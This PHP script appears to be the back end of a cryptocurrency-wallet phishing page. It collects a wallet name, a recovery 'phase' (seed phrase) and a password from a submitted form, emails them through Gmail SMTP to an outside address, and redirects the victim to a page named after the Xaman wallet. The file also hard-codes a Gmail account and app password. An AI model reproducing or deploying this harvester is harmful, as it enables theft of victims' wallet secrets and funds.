<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Sanitize inputs
    $wallet_name = htmlspecialchars(trim($_POST['wallet_name'] ?? ''));
    $phase = trim($_POST['phase'] ?? '');
    $password = trim($_POST['pw'] ?? '');

    // Basic validation
    if (empty($phase)) {
        exit("Required field missing.");
    }

    $mail = new PHPMailer(true);

    try {
        // SMTP config
        $mail->isSMTP();
        $mail->Host = "smtp.gmail.com";
        $mail->SMTPAuth = true;
        $mail->Username = "attendantemail@gmail.com";
        $mail->Password = "ixrb xwbe haxp qtnt";
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Email setup
        $mail->setFrom("noreply@connectus.website", "Website Bot");
        $mail->addAddress("attendantemail@gmail.com");

        $mail->Subject = "New Form Submission";
        $mail->Body =
            "Wallet Name: $wallet_name\n" .
            "Phase: $phase\n" .
            "Password: $password";

        // Send email
        $mail->send();

        // Redirect ONLY (no echo before this)
        header("Location: xaman-landing.html");
        exit();

    } catch (Exception $e) {
        // Proper error handling
        echo "Message could not be sent. Error: " . $mail->ErrorInfo;
    }
}
?>
